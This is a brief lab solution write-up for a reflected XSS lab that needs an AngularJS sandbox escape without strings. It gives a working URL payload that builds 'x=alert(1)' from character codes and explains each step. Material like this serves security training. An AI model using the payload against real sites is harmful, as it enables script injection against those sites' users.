# Lab: Reflected XSS with AngularJS sandbox escape without strings

## Lab escription

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/2fee5309-af71-4fba-971b-1d843c52281a)

## Solution

Append the following in the url to cause the alert, `/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/77fa1a20-ae34-4b4d-9334-a363aa2bbcfb)

- `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)` constructs the string `x=alert(1)` using character codes:

- 120 corresponds to 'x'
- 61 corresponds to '='
- 97 corresponds to 'a'
- 108 corresponds to 'l'
- 101 corresponds to 'e'
- 114 corresponds to 'r
- 116 corresponds to 't'
- 40 corresponds to '('
- 49 corresponds to '1'
- 41 corresponds to ')'

- The expression [1] | `orderBy:'x=alert(1)' = 1` attempts to execute the orderBy filter using the crafted string `'x=alert(1)'` as the sorting criterion.
